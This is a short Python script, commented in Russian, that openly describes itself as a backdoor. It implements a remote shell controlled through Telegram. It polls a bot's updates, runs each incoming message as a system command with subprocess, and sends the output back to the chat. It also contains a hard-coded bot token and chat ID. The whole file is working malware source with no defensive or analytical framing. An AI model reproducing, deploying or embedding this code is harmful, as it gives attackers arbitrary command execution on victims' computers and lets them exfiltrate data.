import requests
import subprocess
import time

TOKEN = "7812032063:AAHcpDZge7GoAFkgzVXMncdlyXn3eAX2A18"  # Полученный от @BotFather
CHAT_ID = "7812032063"  # Узнать можно через @getmyid_bot

def send_message(text):
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={text}")

def main():
    send_message("🔌 Backdoor activated!")
    while True:
        cmd = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates").json()
        if "text" in cmd["result"][-1]["message"]:
            command = cmd["result"][-1]["message"]["text"]
            if command == "exit":
                break
            output = subprocess.getoutput(command)
            send_message(output)
        time.sleep(2)

if __name__ == "__main__":
    main()